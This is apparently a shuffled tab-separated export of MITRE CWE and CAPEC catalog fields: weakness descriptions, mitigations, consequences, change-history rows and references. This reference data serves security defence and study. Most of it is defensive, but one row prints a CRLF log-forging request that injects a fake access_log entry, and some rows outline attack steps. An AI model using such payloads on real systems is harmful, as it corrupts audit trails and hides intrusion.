12099	36	http://www.infosecwriters.com/text_resources/pdf/Footprinting.pdf
24662	66	Unserializing user-supplied data, a bad idea
24490	36	http://www.owasp.org/index.php/Integer_overflow
19750	40	For an Attacker to viably execute this attack, some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere.
8307	23	An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.
14370	62	updated Observed_Examples
7453	51	2015-11-09
17858	79	Confidentiality
7615	79	Confidentiality
16067	28	CWE Content Team
23963	72	User's passwords may be revealed.
17603	42	Do not reuse PRNG seeds. Consider a PRNG that periodically re-seeds itself as needed from a high quality pseudo-random output, such as hardware devices.
23957	57	Resultant
6760	81	Integrity
19769	62	updated Relationships, Taxonomy_Mappings
16770	28	CWE Content Team
21036	39	2010-12-13
20193	97	Hijacking a privileged process
9559	30	Matteo Carli
21051	79	Authorization
11817	62	updated Description, Likelihood_of_Exploit, Name, Potential_Mitigations, Relationships
23177	95	[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).
11370	28	CWE Content Team
23885	92	Explore
6096	72	The application could be placed in an insecure state that may allow an attacker to modify sensitive data or allow unintended logic to be executed.
14394	79	Integrity
15919	39	2014-06-23
16224	28	CWE Content Team
11599	25	High
17735	69	Draft
6620	28	CWE Content Team
7418	62	updated Relationships, Other_Notes, Taxonomy_Mappings
21105	28	CWE Content Team
17589	39	2011-03-29
8048	56	ChildOf
9036	95	[Attempt variations on input parameters] The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an adversary requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads which include a reference to the remote PHP script. He records all the responses from the server that include the output of the execution of remote PHP script.
24842	103	Primary
19593	31	1003
18765	54	Medium
23086	56	ChildOf
23002	62	updated Description, Name
8070	23	In this attack pattern, an adversary injects a connection reset packet to one or both ends of a target's connection. The attacker is therefore able to have the target and/or the destination server sever the connection without having to directly filter the traffic between them.
17745	35	MITRE
5588	85	631
6104	35	MITRE
15171	31	699
15997	26	Implementation
25088	44	High
23746	43	Simple
13718	39	2009-07-27
6052	26	Architecture and Design
12511	39	2014-07-30
8543	91	Testing
14122	79	Access Control
10044	62	updated Potential_Mitigations
21312	35	MITRE
24843	35	MITRE
12716	56	ChildOf
23050	76	2017-05-01
20543	100	The MITRE Corporation
16481	63	Bypass Protection Mechanism
24651	66	The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software
7236	39	2008-11-24
20899	73	Manipulate the file names that are explicitly sent to the server.
8326	81	Confidentiality
11400	102	ChildOf
8966	61	Stable
12607	28	CWE Content Team
13055	85	150
20059	73	Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.                   For example: The HTTP request for "/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] "GET /forged-path HTTP/1.1" 200 - "-" USER_AGENT" may add the log line into Apache "access_log" (for example). Different applications may require different encodings of the carriage return and line feed characters.
20404	39	2008-07-01
12041	63	Gain Privileges or Assume Identity
22187	104	1117
13359	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
9869	28	CWE Content Team
9242	53	The MITRE Corporation
21076	39	2008-10-14
7197	56	ChildOf
9979	42	Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.                   For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
15758	35	MITRE
24026	62	updated Description
13004	35	MITRE
18210	88	Permission Race Condition During Resource Copy
20568	91	Architecture and Design
13448	33	C Matthew Curtin
15827	43	Simple
24262	66	Password Hashing
18026	79	Accountability
17072	24	MITRE
11058	62	updated Common_Consequences
9917	101	CAPEC Content Team
10770	39	2008-09-08
20421	103	Primary
21549	47	Other
24813	76	2019-04-04
18593	26	Implementation
22786	23	A product does not check to see if a lock is present before performing sensitive operations on a resource.
22897	28	CWE Content Team
23378	60	02
18051	102	ChildOf
20001	62	updated Common_Consequences
19234	28	CWE Content Team
7302	39	2011-09-13
22403	50	Configuration: Get latest updates for the computer.
7555	39	2012-10-30
7195	35	MITRE
23364	95	The attacker crafts a malicious URL string request and sends it to the server.
9266	62	updated Common_Consequences, Demonstrative_Examples, Relationships
8791	35	Cigital
7783	81	Availability
7503	91	Build and Compilation
20299	25	High
9919	77	Manual Static Analysis
23138	35	MITRE
14138	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
12889	66	Rainbow table
8219	43	Simple
5596	21	7 Pernicious Kingdoms
19507	39	2010-09-27
13531	39	2008-09-08
11800	56	ChildOf
22477	63	Bypass Protection Mechanism
11962	26	Implementation
11737	102	ChildOf
19927	57	Primary
17100	40	The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.
5754	45	Variant
25348	39	2008-07-01
10115	35	MITRE
23254	66	Secure Coding in C and C++
9735	28	Eric Dalci
7609	102	ChildOf
21377	62	updated Observed_Examples, Relationships
15819	28	CWE Content Team
14055	68	While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie.
16001	35	MITRE
17466	40	The ability to calculate a card checksum and write out a valid checksum value. Some cards are protected by a checksum calculation, therefore it is necessary to determine what algorithm is being used to calculate the checksum and to employ that algorithm to calculate and write a new valid checksum for the card being created.
11401	28	CWE Content Team
16423	63	DoS: Resource Consumption (CPU)
14799	62	updated Relationships
14697	56	ChildOf
6511	69	Incomplete
6735	35	MITRE
23162	23	A capture-replay flaw exists when the design of the software makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).
9306	62	updated Common_Consequences, Other_Notes, Relationship_Notes
12232	28	CWE Content Team
23061	62	updated Applicable_Platforms, Likelihood_of_Exploit
14283	81	Availability
21116	55	CAPEC Content Team
10672	88	Use of Same Invokable Control Element in Multiple Architectural Layers
8650	63	Unexpected State
10877	39	2017-11-08
17188	63	Modify Application Data
10471	39	2009-10-29
5700	62	updated Common_Consequences
11509	28	CWE Content Team
15434	35	MITRE
18158	33	Wojciech Zaremba
14445	40	The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.
23121	62	updated Time_of_Introduction
12652	28	CWE Content Team
14467	88	Return of Wrong Status Code
11682	35	MITRE
15546	103	Primary
15480	56	ChildOf
18655	31	1000
23044	50	In a J2EE setting, administrators can associate a role that is impossible for the authenticator to grant users, such as "NoAccess", with all Servlets to which access is guarded by a limited number of servlets visible to, and accessible by, the user.                Having done so, any direct access to those protected Servlets will be prohibited by the web container.                In a more general setting, the administrator must mark every resource besides the ones supposed to be exposed to the user as accessible by a role impossible for the user to assume. The default security setting must be to deny access and then grant access only to those resources intended by business logic.
19081	66	Handling Errors Exceptionally Well in C++
13689	39	2012-05-11
24885	62	updated Relationships
6886	70	The state of homograph attacks
15275	63	Read Memory
19397	35	MITRE
6739	55	CAPEC Content Team
13278	81	Access Control
9195	62	updated Applicable_Platforms, Taxonomy_Mappings
16255	28	CWE Content Team
12411	35	MITRE
14099	35	MITRE
19470	46	While developers might expect that there is a very narrow time window between the time of check and time of use, there is still a race condition. An attacker could cause the software to slow down (e.g. with memory consumption), causing the time window to become larger. Alternately, in some situations, the attacker could win the race by performing a large number of attacks.
18792	28	CWE Content Team
17684	80	If the client site token is obfuscated.
12571	104	236
15047	62	updated Potential_Mitigations, Time_of_Introduction
8546	46	For example, with Java, a class that is made persistent requires both hashCode() and equals() methods to be defined. This issue can prevent the software from running reliably, due to incorrect or unexpected comparison results.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
6213	47	Read Data
17018	62	updated Relationships
12881	31	1000
23460	62	updated Common_Consequences
24008	28	CWE Content Team
5950	63	Gain Privileges or Assume Identity
15611	56	ChildOf
14124	43	Simple
7001	95	Identify a place in the program where user input may be used to escalate privileges by for instance accessing unauthorized file system resources through directory browsing.
12646	92	Exploit
22785	39	2010-12-13
24741	39	2012-05-11
24008	39	2009-05-27
24917	70	Protecting Browsers from DNS Rebinding Attacks
23434	53	The MITRE Corporation
12741	35	MITRE
18559	45	Compound
21605	76	2018-07-31
8030	42	Developers should anticipate that variable name delimiters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
10103	62	updated Common_Consequences, Potential_Mitigations, References
12532	88	Only Filtering Special Elements at a Specified Location
22057	50	Design: Enforce principle of least privilege.
24935	45	Base
8138	35	MITRE
15829	28	CWE Content Team
8551	34	This problem is frequently found when the regular expression is used in input validation or security features such as authentication.
19570	28	Eric Dalci
17012	101	CAPEC Content Team
15048	62	updated References, Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
24160	39	2012-10-30
6999	62	updated Relationships, Taxonomy_Mappings
8942	38	Null characters are observed by the filter. The filter needs to be able to understand various encodings of the Null character, or only canonical data should be passed to it.
21018	39	2011-06-01
11244	62	updated Description
19815	96	2008-01-18
5652	55	CAPEC Content Team
9116	43	Simple
16355	90	Language-Independent
19721	81	Other
18272	35	MITRE
11894	21	PLOVER
17168	21	CWE Content Team
10803	39	2014-07-30
7496	28	CWE Content Team
7374	62	updated Description, Potential_Mitigations
20287	31	699
12654	95	[Increase the accuracy of server fingerprinting of Web servers] Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.
12521	39	2009-07-27
20130	39	2017-11-08
5895	28	Eric Dalci
23031	33	Vladimir Vorontsov
10587	103	Primary
21431	79	Access Control
25280	59	Updated @Abstraction, Related_Attack_Patterns
7216	28	CWE Content Team
18419	28	CWE Content Team
24592	62	updated Description
14238	28	CWE Content Team
19550	39	2017-11-08
8333	71	2010
21398	31	699
19499	39	2017-01-19
17669	28	Eric Dalci
12630	63	Execute Unauthorized Code or Commands
11127	61	Draft
17100	40	An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.
17795	55	CAPEC Content Team
9313	95	An attacker first probes to figure out what restrictions on input are placed by filter, such as a specific characters on the end of the URL.
13557	28	CWE Content Team
21204	45	Base
17195	39	2012-05-11
9248	28	CWE Content Team
16247	66	Introduction to Secure Coding Guide
18450	30	T. Berners-Lee
12771	91	Implementation
10447	28	CWE Content Team
10696	50	In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.
14396	91	Architecture and Design
15750	85	273
21679	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
24486	35	MITRE
8447	35	MITRE
22664	92	Explore
9785	78	Very High
22841	46	This issue can make the software perform more slowly, as connection pools allow connections to be reused without the overhead and time consumption of opening and closing a new connection.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
20216	28	CWE Content Team
6620	39	2008-11-24
14857	55	CAPEC Content Team
13912	61	Draft
25387	50	Implementation: Session tokens for specific host
18287	62	updated Common_Consequences
11868	77	Manual Static Analysis - Source Code
7979	39	2014-07-30
15604	56	ChildOf
20696	35	MITRE
12309	35	MITRE
10783	51	2017-01-04
5982	81	Availability
18419	39	2015-12-07
13560	28	CWE Content Team
20572	28	Eric Dalci
8101	56	ChildOf
24392	40	A resource is accessed/modified concurrently by multiple processes such that a race condition exists.
15843	39	2014-06-23
14377	31	699
12086	97	Amplification
18759	35	MITRE
24219	35	MITRE
25153	42	Clone all mutable data before returning references to it. This is the preferred mitigation. This way, regardless of what changes are made to the data, a valid copy is retained for use by the class.
9648	28	CWE Content Team
15326	35	MITRE
10984	39	2011-06-01
8986	39	2017-01-19
7741	56	CanPrecede
20388	35	MITRE
21363	45	Base
16396	59	Updated Related_Weaknesses
7532	39	2013-02-21
13805	62	updated Time_of_Introduction
11701	28	CWE Content Team
19226	56	ChildOf
16149	28	Eric Dalci
17521	56	ChildOf
23281	62	updated Relationships, Taxonomy_Mappings
8258	102	ChildOf
20773	79	Access Control
12543	77	Automated Static Analysis
10795	46	This typically occurs when the pointer or its index is incremented to a position beyond the bounds of the buffer or when pointer arithmetic results in a position outside of the valid memory location to name a few. This may result in exposure of sensitive information or possibly a crash.
15575	51	2014-06-23
8636	78	Very High
21604	39	2017-11-08
16579	73	Test the page using DOM injection, (gotRoot(''))
23857	28	CWE Content Team
9618	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
11056	39	2008-07-01
12518	28	CWE Content Team
24923	60	08
14918	94	Successful deciphering of protocol information compromises the confidentiality of future sensitive communications.
8578	59	Updated Related_Attack_Patterns
12455	39	2011-06-01
22501	91	Implementation
15524	63	Read Files or Directories
9003	31	699
15942	101	CAPEC Content Team
10367	35	MITRE
24179	62	updated Affected_Resources, Demonstrative_Examples, Relationships, White_Box_Definitions
6420	39	2010-02-16
5864	35	MITRE
19903	28	CWE Content Team
16766	88	Use of Single-factor Authentication
15104	104	665
21363	43	Simple
18847	45	Base
16863	35	MITRE
10187	39	2011-06-01
23820	28	CWE Content Team
13156	35	MITRE
10149	39	2009-10-29
20688	62	updated Relationships
8733	35	Cigital
18044	31	1000
13228	21	CLASP
22676	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
22992	76	2019-09-30
16707	62	updated Demonstrative_Examples, Name, Potential_Mitigations, Relationships, Taxonomy_Mappings
6143	62	updated Relationships
6443	101	CAPEC Content Team
11890	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
18308	35	MITRE
14571	51	2014-06-23
6825	95	[Survey Application]
21259	46	The rate at which true random numbers can be generated is limited. It is important that one uses them only when they are needed for security.
21822	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18836	72	Generally this error will cause the data structure to not work properly.
7431	104	259
18526	62	updated Common_Consequences
24495	62	updated Applicable_Platforms, Relationships
11085	28	Eric Dalci
24650	35	MITRE
16327	67	High
25268	39	2009-12-28
6278	48	12
11566	74	2
11101	39	2014-07-30
9954	39	2011-09-13
10804	91	Implementation
24749	28	CWE Content Team
16084	28	Eric Dalci
24967	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
23819	28	CWE Content Team
24383	39	2009-10-29
12711	103	Primary
6843	62	updated Potential_Mitigations
13863	35	MITRE
21726	79	Other
20599	85	148
15042	78	High
8734	62	updated Demonstrative_Examples, Potential_Mitigations
18372	56	ChildOf
19503	62	updated Related_Attack_Patterns
22304	62	updated Detection_Factors
10630	35	MITRE
11461	62	updated Observed_Examples, Relationships, Taxonomy_Mappings
20350	81	Integrity
16846	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8603	39	2008-08-01
25405	39	2017-11-08
24718	85	413
13565	46	Originating from software security, an "attack surface" measure typically reflects the number of input points and output points that can be utilized by an untrusted party, i.e. a potential attacker. A larger attack surface provides more places to attack, and more opportunities for developers to introduce weaknesses.  In some cases, this measure may reflect other aspects of quality besides security; e.g., a product with many inputs and outputs may require a large number of tests in order to improve code coverage.
23269	39	2012-10-30
9177	28	CWE Content Team
6090	104	258
22057	50	Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.
15111	28	CWE Content Team
9984	26	Architecture and Design
12169	101	CAPEC Content Team
15271	100	The MITRE Corporation
17791	28	CWE Content Team
16991	63	Read Application Data
9208	39	2017-11-08
25312	28	CWE Content Team
18447	35	MITRE
24030	103	Primary
23168	23	An attacker can inject a drive letter or Windows volume letter ('C:dirname') into a software system to potentially redirect access to an unintended location or arbitrary file.
22453	69	Draft
7581	49	2008
8884	86	http://msdn.microsoft.com/en-us/library/ms682586%28v=VS.85%29.aspx
19536	76	2019-04-04
16222	26	Implementation
19378	56	ChildOf
19243	92	Exploit
12636	23	An adversary sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, the adversary can identify that the host is alive by looking for a RST packet. Typically, a remote server will respond with a RST regardless of whether a port is open or closed. In this way, TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping can be used to discover if a host is alive via RST response packets sent from the host.
6107	103	Primary
18241	21	PLOVER
15653	61	Draft
18010	66	File descriptors and setuid applications
7174	62	updated Relationships
22826	62	updated Relationships
18987	88	Reliance on Package-level Scope
20221	62	updated Common_Consequences
7802	56	ChildOf
7445	67	Low
12093	62	updated Background_Details, Common_Consequences, Demonstrative_Examples, Description, Maintenance_Notes, Name, Potential_Mitigations, References
20252	28	CWE Content Team
20395	35	MITRE
22586	28	CWE Content Team
19760	31	1000
6756	28	CWE Content Team
25217	39	2008-09-08
7814	39	2009-01-12
9039	42	Ensure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script.
19749	57	Primary
20373	62	updated Related_Attack_Patterns
13940	80	Adversaries require non-trivial technical skills to create and implement fault injection attacks on mobile devices. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks), they usual require significant setup and experimentation time during which physical access to the device is required. This prerequisite makes the attack challenging to perform (assuming that physical security countermeasures and monitoring are in place).
24488	91	Architecture and Design
18026	79	Authorization
12120	50	Use a language or compiler that performs automatic bounds checking.
22969	28	CWE Content Team
21478	81	Confidentiality
10067	73	Use a proxy tool to record the HTTP responses headers.
12536	74	2
23085	28	CWE Content Team
13056	62	updated Common_Consequences
8050	63	Other
14872	85	426
25278	45	Base
11135	73	Use tools to send bogus SQL query to the server and check error pages.
9464	76	2019-04-04
7017	90	Language-Independent
12968	91	Implementation
20463	63	Read Application Data
22325	35	MITRE
8696	39	2008-09-08
22009	46	This may allow an attacker to execute arbitrary code, or at least modify what code can be executed.
10593	35	MITRE
16002	100	The MITRE Corporation
13380	35	MITRE
12536	73	Select dictionary based on particular users' preferred languages.
7382	100	The MITRE Corporation
18921	91	Architecture and Design
10173	69	Incomplete
12370	72	If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties.
15673	35	MITRE
10131	28	CWE Content Team
24416	28	CWE Content Team
15539	28	CWE Content Team
9027	78	Medium
20092	35	MITRE
24160	35	MITRE
14077	26	Operation
7932	28	Eric Dalci
22200	40	This attack is only applicable when a vulnerable entity associates data or services with an identity. Without such an association, there would be no reason to fake the source.
15856	23	The application does not conform to the API requirements for a function call that requires extra privileges. This could allow attackers to gain privileges by causing the function to be called incorrectly.
16901	39	2014-06-23
5878	35	MITRE
12448	39	2009-05-27
15089	91	Installation
17992	42	Use OS-level preventative functionality, such as ASLR. This is not a complete solution.
19532	35	MITRE
23574	35	MITRE
18121	103	Primary
18472	102	ChildOf
20554	62	updated Potential_Mitigations
23077	79	Integrity
17649	39	2008-10-14
8373	35	MITRE
20598	39	2012-05-11
17562	50	Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.
9709	66	Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes
9060	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
16175	31	1000
17230	81	Integrity
17342	28	CWE Content Team
25056	39	2011-06-01
15847	28	CWE Content Team
16287	100	The MITRE Corporation
20138	35	MITRE
12073	89	Standard
23539	35	MITRE
10496	74	3
12601	81	Non-Repudiation
25401	39	2011-06-01
12504	100	The MITRE Corporation
10227	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
6134	79	Confidentiality
8060	23	An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.
18720	81	Other
8060	54	Medium
21961	79	Confidentiality
20411	89	Meta
17543	39	2012-10-30
15751	39	2017-11-08
15050	78	Medium
23309	51	2014-06-23
20726	81	Confidentiality
18994	28	CWE Content Team
18794	103	Primary
22995	35	MITRE
14411	23	In this attack pattern, the adversary transmits disruptive signals in the direction of the target consumer-level satellite dish (as opposed to the satellite itself). The transmission disruption occurs in a more targeted range. Portable terrestrial jammers have a range of 3-5 kilometers in urban areas and 20 kilometers in rural areas. This technique requires a terrestrial jammer that is more powerful than the frequencies sent from the satellite.
21590	90	C++
19824	39	2009-10-29
10120	62	updated Potential_Mitigations
18038	42	When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
11544	62	updated Common_Consequences, Description
22317	35	MITRE
6115	28	CWE Content Team
17407	23	The program omits a break statement within a switch or similar construct, causing code associated with multiple conditions to execute. This can cause problems when the programmer only intended to execute code associated with one condition.
13338	76	2015-11-09
20644	35	MITRE
7332	84	19
24297	80	To deploy a hidden process or malware on the system to automatically collect clipboard data.
17218	88	Path Equivalence: 'filename....' (Multiple Trailing Dot)
11187	78	High
9355	69	Draft
12813	62	updated Relationships
17000	39	2009-03-10
19674	91	Implementation
20871	68	An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
20294	72	If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator.
22294	28	CWE Content Team
12762	23	Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation.
22240	47	Modify Data
18721	62	updated Other_Notes
21241	28	CWE Content Team
14756	28	CWE Content Team
22887	35	MITRE
25206	28	CWE Content Team
11363	56	ChildOf
11379	63	DoS: Crash, Exit, or Restart
12115	62	updated Relationships
17963	76	2015-11-09
13463	100	The MITRE Corporation
23701	39	2008-09-08
18533	28	CWE Content Team
16079	39	2017-11-08
7891	103	Primary
22564	62	updated Time_of_Introduction
10002	86	http://blogs.sans.org/appsecstreetfighter/2010/03/01/top-25-series-rank-2-sql-injection/
11255	39	2012-05-11
18374	35	Cigital
11749	77	Automated Static Analysis - Source Code
13582	63	Modify Application Data
22435	56	ChildOf
18014	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
24945	39	2012-05-11
11391	69	Incomplete
13021	51	2014-06-23
18488	28	CWE Content Team
5962	63	Read Files or Directories
10768	70	Wikipedia
15994	26	Architecture and Design
20158	62	updated Potential_Mitigations
10266	47	Execute Unauthorized Commands
12910	101	CAPEC Content Team
12175	50	Design: Enforce principle of least privilege
18284	79	Confidentiality
14686	47	Execute Unauthorized Commands
20576	91	Architecture and Design
12156	31	699
6965	102	ChildOf
16907	88	Improper Validation of Certificate with Host Mismatch
21750	35	MITRE
11268	63	Varies by Context
16563	73	Use a proxy tool to record all links visited during a manual traversal of the web application.
18623	97	Modify Shared File
24210	39	2014-06-23
21366	71	2002
19078	67	High
5836	35	MITRE
12219	25	High
21592	62	updated Observed_Examples, Relationships, Taxonomy_Mappings
13765	62	updated Taxonomy_Mappings
18820	76	2019-09-30
7519	28	CWE Content Team
12867	79	Confidentiality
18176	27	None: No specialized resources are required to execute this type of attack.
20008	39	2012-05-11
24733	62	updated Description, Other_Notes
10550	56	ChildOf
21350	77	Architecture or Design Review
18453	67	High
13267	91	Architecture and Design
13831	81	Availability
11787	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
9671	57	Indirect
8523	35	Cigital
23826	101	CAPEC Content Team
11793	28	CWE Content Team
16260	31	699
17553	35	MITRE
24814	47	Execute Unauthorized Commands
23173	76	2019-04-04
12554	39	2014-07-30
22946	31	1000
15632	28	CWE Content Team
20308	39	2017-11-08
19293	55	CAPEC Content Team
22362	81	Access Control
17561	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
11268	63	Modify Application Data
13440	39	2014-07-30
10584	88	Improper Handling of Mixed Encoding
23248	50	Never use implicit intents for inter-application communication.
6651	21	PLOVER
15118	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
10579	33	Joao Antunes
10873	44	SOAR Partial
6332	63	Gain Privileges or Assume Identity
24557	35	MITRE
7715	35	MITRE
17980	28	CWE Content Team
11470	28	CWE Content Team
19890	28	CWE Content Team
16528	97	Obstruction
20600	35	MITRE
21726	94	Depending on the intention of the adversary, a successful TypoSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.
21057	28	CWE Content Team
22380	62	updated Potential_Mitigations
9454	50	Design: Enforce principle of least privilege
8566	90	C
22095	50	Implement Ingress filters to check the validity of received routes. However, this relies on the accuracy of Internet Routing Registries (IRRs) databases which are often not well-maintained.                Implement Secure BGP (S-BGP protocol), which improves authorization and authentication capabilities based on public-key cryptography.
7168	47	Unreliable Execution
10846	91	Architecture and Design
8434	62	updated Common_Consequences
8906	97	Install New Service
17837	35	MITRE
15782	35	MITRE
6071	35	MITRE
19844	104	45
16386	63	Varies by Context
9794	72	Potentially data could be tampered with by another function which should not have been tampered with.
18522	61	Draft
13205	39	2008-10-14
9335	35	MITRE
10482	69	Incomplete
12175	50	Perform appropriate bounds checking on all buffers.
11546	62	updated Time_of_Introduction
7405	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The '....' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to "..\..\.." and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of "./" sequences, can ultimately produce valid ".." sequences due to a collapse into unsafe value (CWE-182).
21537	39	2009-03-10
8426	39	2011-03-29
21165	62	updated Description, Name, Relationships
19773	103	Primary
18449	62	updated Applicable_Platforms, Demonstrative_Examples
24446	39	2011-03-29
21163	39	2008-07-01
8406	50	Use multifactor authentication.
9203	57	Primary
7176	62	updated Time_of_Introduction
21131	26	Implementation
20217	28	CWE Content Team
21134	50	Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement specific, white-list approach.
17117	85	495
23522	35	Cigital
25188	35	MITRE
20412	97	XSS Through HTTP Query Strings
19872	50	Implementation: Perform input validation for all remote content, including remote and user-generated content
18795	39	2008-07-01
6809	23	This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.
8789	28	CWE Content Team
25172	39	2018-03-27
19600	39	2014-07-30
15490	50	Implementation: Obfuscate server fields of HTTP response.
7263	39	2011-09-13
24780	45	Base
23059	56	ChildOf
17581	39	2011-06-01
11038	74	1
22484	86	http://developer.apple.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html
10493	28	CWE Content Team
21713	92	Experiment
24502	59	Updated Description Summary, Resources_Required
6402	63	Other
6430	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
14884	39	2011-06-01
20509	39	2009-07-27
17579	57	Primary
24992	86	http://www.unixwiz.net/techtips/sql-injection.html
11377	80	In a web based scenario, the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism.
21874	35	MITRE
17979	35	MITRE
25369	88	Missing Authorization
14155	23	The software does not handle or incorrectly handles a compressed input with a very high compression ratio that produces a large output.
17125	43	Simple
14557	78	Low
22476	47	Execute Unauthorized Commands
22630	56	CanAlsoBe
19294	79	Access Control
24959	45	Variant
9687	45	Class
18582	92	Explore
19670	39	2008-07-01
17339	62	updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
9947	56	ChildOf
24136	28	CWE Content Team
12584	62	updated Applicable_Platforms
20379	23	The software makes an explicit call to the finalize() method from outside the finalizer.
17308	103	Primary
7716	80	Easy to use tools exist to automate this attack.
13515	35	MITRE
15748	62	updated Relationships
12922	62	updated Relationships
7236	62	updated Relationships, Taxonomy_Mappings
15575	55	CAPEC Content Team
19937	50	Properly validate the data (syntactically and semantically) before writing it to the database.
22805	35	MITRE
16660	35	MITRE
23155	39	2009-03-10
25402	69	Draft
19707	56	ChildOf
6154	35	MITRE
21514	35	MITRE
16120	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
8922	62	updated Relationships
19303	47	Modify Data
10802	79	Authorization
19040	24	MITRE
